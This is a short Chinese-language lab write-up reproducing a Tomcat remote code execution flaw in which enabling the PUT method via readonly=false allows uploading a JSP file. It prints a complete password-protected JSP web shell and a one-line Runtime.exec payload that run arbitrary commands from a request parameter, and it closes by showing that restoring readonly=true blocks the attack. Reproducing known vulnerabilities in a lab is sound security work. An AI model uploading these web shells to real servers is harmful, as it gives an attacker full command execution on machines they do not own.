# TOMCAT RCE 1
TomcatRCE漏洞复现
## 1、       介绍：
## 2、       环境搭建：
### 1、       下载问题版本tomcat，地址：`https://archive.apache.org/dist/tomcat/`
### 2、       在windows上安装tomcat<br>
![image]()t.1<br>
### 3、       设置readonly配置（配置文件路径为conf/web.xml），该配置禁止（false）时将开启put方法，默认是true。<br>
t.2<br>
查看目前支持的方法：<br>
t.3<br>
在servlet中添加：readonly属性为false<br>
t.4<br>
使用burpsuite抓包：（采用put方法，设置成功）<br>
t.5<br>
环境搭建完毕。
## 3、       漏洞复现：
准备payload:
先准备jsp文件：
```jsp
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
 
+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("123456".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println("ok");}%>
```
将该段代码复制到burpsuite表单位置：<br>
t.6<br>
浏览器链接jsp：<br>
t.7<br>
表示上传成功；
执行命令：<br>
t.8<br>
证明命令执行成功。
也可以使用简单的payload：
```<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>```<br>
t.9<br>
将readonly策略开启（设置为true）：<br>
t.10<br>
则不成功。


